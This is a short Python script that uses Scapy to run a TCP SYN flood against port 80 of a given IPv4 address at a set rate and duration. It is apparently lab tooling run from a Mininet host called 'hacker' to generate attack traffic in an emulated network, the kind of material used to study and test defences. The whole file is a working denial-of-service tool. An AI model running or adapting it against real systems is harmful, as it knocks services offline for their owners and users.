#!/usr/bin/env python3
"""Run a TCP SYN flood from a Mininet host namespace.

Example usage (from the Mininet CLI):
    mininet> hacker python3 src/scripts/syn_flood.py -d 30 -p 200 10.0.3.10
"""

from __future__ import annotations

import argparse
import random
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

# Default flood profile for demo traffic generation.
DEFAULT_SYN_FLOOD_DURATION = 30
DEFAULT_SYN_FLOOD_PPS = 200


def syn_flood(
    target: IPv4Address,
    *,
    duration: int = DEFAULT_SYN_FLOOD_DURATION,
    pps: int = DEFAULT_SYN_FLOOD_PPS,
) -> None:
    """Send a burst of TCP SYN packets to target:80.

    Args:
        target: Destination IPv4 address.
        duration: How long to sustain the flood in seconds.
        pps: Packets per second.
    """
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    sent = 0

    print(f"[{FILE_NAME}] {target=} {duration=}s {pps=}")

    while time.monotonic() < end_time:
        pkt = scapy.IP(dst=str(target)) / scapy.TCP(
            sport=random.randint(1024, 65535),  # noqa: S311
            dport=80,
            flags="S",
        )
        scapy.send(pkt, verbose=False)
        sent += 1
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent} packets sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate TCP SYN flood traffic.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("target", type=IPv4Address, help="Target IPv4 address")
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_SYN_FLOOD_DURATION,
        help="Flood duration in seconds",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_SYN_FLOOD_PPS,
        help="Packets per second",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    syn_flood(args.target, duration=args.duration, pps=args.pps)


if __name__ == "__main__":
    main()
